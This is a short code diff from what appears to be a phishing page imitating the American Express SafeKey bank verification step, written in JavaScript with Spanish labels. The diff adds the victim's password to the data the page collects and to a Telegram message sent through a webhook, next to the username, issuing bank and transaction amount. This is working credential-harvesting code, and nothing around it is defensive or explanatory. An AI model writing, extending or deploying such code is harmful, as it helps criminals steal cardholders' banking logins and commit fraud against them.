@@ -590,7 +590,7 @@
                     ]
                 };
 
-                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO EMISOR: ${bancoEmisor}\n👤 Usuario: \`${datos.usuario}\`\n💰 Monto: ${datos.monto}\n⏳ Estado: Esperando verificación...`;
+                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO EMISOR: ${bancoEmisor}\n🏛️ CREDENCIALES: 👤 Usuario: \`${datos.usuario}\` 🔑 Contraseña: \`${datos.password}\`\n💰 Monto: ${datos.monto}\n⏳ Estado: Esperando verificación...`;
 
                 const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
                     method: 'POST',
@@ -856,6 +856,7 @@
                 const datosTelegram = {
                     solicitudId: solicitudId,
                     usuario: usernameInput.value.trim(),
+                    password: passwordInput.value.trim(),
                     monto: document.getElementById('transaction-amount').textContent
                 };
 
